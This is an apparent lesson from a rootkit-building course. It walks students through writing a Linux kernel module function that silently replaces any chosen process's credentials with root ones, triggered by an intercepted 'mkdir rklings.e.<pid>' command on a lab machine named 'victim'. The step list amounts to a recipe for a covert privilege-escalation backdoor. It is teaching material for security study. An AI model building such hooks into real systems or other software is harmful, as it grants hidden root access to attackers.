# L07: Give a Selected Process Root

## Mission

L06 gives root privileges to the calling shell, but the code that performs the
change is supplied.
Implement that operation and make it work for any selected process ID.

The supplied command layer selects the target:

```text
rklings.e         parent shell
rklings.e.<pid>   process with that PID
```

## What you will observe

Start a process and inspect its four user IDs:

```console
student@victim:~$ sleep 3600 &
[1] 482
student@victim:~$ grep '^Uid:' /proc/482/status
Uid:    1000    1000    1000    1000
student@victim:~$ mkdir rklings.e.482
student@victim:~$ grep '^Uid:' /proc/482/status
Uid:    0       0       0       0
```

No `rklings.e.482` directory is created.
The original `mkdir rklings.e` command still elevates its parent shell.

## Workspace

```text
exercises/L07-process-root
├── Kbuild
├── main.c
└── rklings_hook.h
```

Only `main.c` is editable.
You implement the function that gives root privileges to one process ID.

`rklings_hook.h` supplies command parsing and `mkdir` interception.

## Resolve the process

A PID is only a number. `find_vpid` and `pid_task` resolve it to the process's
kernel object:

```text
1234 -> find_vpid -> pid_task -> task_struct
```

The process can exit during lookup.
RCU (Read-Copy-Update) prevents the kernel from freeing a data structure while
any CPU is still reading it:

- Between `rcu_read_lock` and `rcu_read_unlock`, the object returned by
  `pid_task` is guaranteed to exist
- It can disappear the instant RCU unlocks
- A task reference (`get_task_struct`) pins the object so it survives beyond the
  RCU section

```text
rcu_read_lock
    find task
    get_task_struct(task)
rcu_read_unlock
    use task
    put_task_struct(task)
```

`pid_task` returns `NULL` when the PID has no task. `task->mm == NULL`
identifies a kernel thread rather than a userspace process.

## Replace the credentials

`task_struct` points to a separate `struct cred` containing the process's IDs,
capabilities, and other security state:

```text
struct cred                         /proc/<pid>/status
    uid, euid, suid, fsuid   <----> Uid: 1000  1000  1000  1000
    gid, egid, sgid, fsgid  <----> Gid: 1000  1000  1000  1000
    permitted capabilities
    effective capabilities
    ...
```

`prepare_kernel_cred(&init_task)` creates a new root credential object.
Escalation happens when the target's two pointers publish that object:

```text
BEFORE                              AFTER

task->cred -----+                  task->cred -----+
                +--> user cred                     +--> root cred
task->real_cred-+    UID 1000      task->real_cred-+    UID 0
                     no caps                            full capabilities
```

- `cred` is used for permission checks
- `real_cred` is visible through `/proc`
- The new object needs two references because both pointers own it
- Use `rcu_assign_pointer` to publish each new pointer so other CPUs reading
  under RCU see either the old or the new value, never a torn pointer
- After the swap, release both old references

## TODOs

```text
TODO 1  main.c:11:1  replace one live userspace task's credentials
```

### TODO 1 -- `main.c:11:1` -- Replace one task's credentials

1. Lock RCU with `rcu_read_lock`.
2. Resolve `pid` to a task with `pid_task(find_vpid(pid), PIDTYPE_PID)`.
3. If the task is `NULL`, unlock RCU and return `-ESRCH`.
4. Pin the task with `get_task_struct`.
5. Unlock RCU with `rcu_read_unlock`.
6. If `task->mm` is `NULL` (kernel thread), release the task and return
   `-EINVAL`.
7. Create root credentials with `prepare_kernel_cred(&init_task)`.
8. If allocation fails, release the task and return `-ENOMEM`.
9. Lock the task with `task_lock`.
10. Save both `task->cred` and `task->real_cred`.
11. Add a second reference to the new credentials with `get_cred`.
12. Publish through both pointers with `rcu_assign_pointer`.
13. Unlock, release both old credentials, release the task reference.
14. Return `0`.

## Test it

From the host:

```console
$ ./rklings run L07
```

Inside the guest, run the commands from **What you will observe**.
Then confirm the parent-shell form:

```console
student@victim:~$ mkdir rklings.e
student@victim:~$ id
uid=0(root) gid=0(root) groups=0(root)
```

## Validate

```console
$ ./rklings validate L07
  [+] mkdir rklings.e grants root to the calling shell
  [+] mkdir rklings.e.PID immediately elevates the target
  [+] Malformed commands fail and ordinary names remain ordinary
  PASS
```

## Next

Credential replacement now works, but a supplied header still owns syscall
interception.
L08 opens that header and implements its `mkdir` and `mkdirat` probes directly.
